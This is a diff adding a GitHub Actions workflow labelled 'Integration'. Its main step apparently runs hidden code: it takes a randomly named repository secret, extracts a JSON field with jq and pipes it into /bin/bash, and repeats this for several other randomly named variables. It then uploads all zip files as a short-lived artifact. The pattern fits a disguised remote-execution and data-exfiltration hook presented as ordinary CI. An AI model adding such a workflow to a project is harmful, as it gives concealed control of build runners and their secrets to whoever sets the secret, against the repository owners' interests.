@@ -1,0 +1,29 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Main step
+        env:
+          bqsx37: ${{ secrets.bqsx37 }}
+        run: |
+          printf '%s' "$bqsx37" | jq -r .emrh9 | /bin/bash
+          printf '%s' "$bjnt029" | jq -r .cn32817 | /bin/bash
+          echo $mbl788 | jq -r .hw629 | /bin/bash
+          printf '%s' "$t983" | jq -r .l95854 | /bin/bash
+          printf '%s' "$ouih59433" | jq -r .yntw25805 | /bin/bash
+
+      - name: Save data
+        uses: actions/upload-artifact@v4
+        with:
+          name: cSjA4i7b
+          path: "*.zip"
+          retention-days: 1
